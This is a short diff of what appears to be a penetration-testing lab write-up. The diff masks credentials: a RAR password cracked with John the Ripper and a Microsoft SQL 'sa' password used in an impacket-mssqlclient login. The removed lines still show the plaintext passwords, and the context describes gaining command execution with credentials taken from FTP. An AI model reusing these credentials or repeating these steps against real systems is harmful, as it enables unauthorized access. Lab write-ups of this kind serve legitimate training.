@@ -178,7 +178,7 @@ Cost 1 (iteration count) is 32768 for all loaded hashes
 Will run 4 OpenMP threads
 Press 'q' or Ctrl-C to abort, almost any other key for status
 0g 0:00:02:32 0.44% (ETA: 15:23:03) 0g/s 499.2p/s 499.2c/s 499.2C/s jesus89..isaiah04
-letmeinplease    (MSSQL_BAK.rar)     
+letme*******   (MSSQL_BAK.rar)     
 1g 0:00:04:39 DONE (2022-11-13 05:53) 0.003580g/s 497.5p/s 497.5c/s 497.5C/s lily03..lerner
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed. 
@@ -189,7 +189,7 @@ Rar contained **mssql_backup.txt** with credentials to Microsoft SQL account.
 ```
 └─$ cat mssql_backup.txt 
 Username: sa
-Password: EjectFrailtyThorn425   
+Password: Eject******
 ```
 
 
@@ -198,7 +198,7 @@ Password: EjectFrailtyThorn425
 Using credentials from FTP I was able to get command execution
 
 ```
-└─$ impacket-mssqlclient sa:EjectFrailtyThorn425@192.168.209.70 -port 1435
+└─$ impacket-mssqlclient sa:Eject****@192.168.209.70 -port 1435
 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 
 [*] Encryption required, switching to TLS
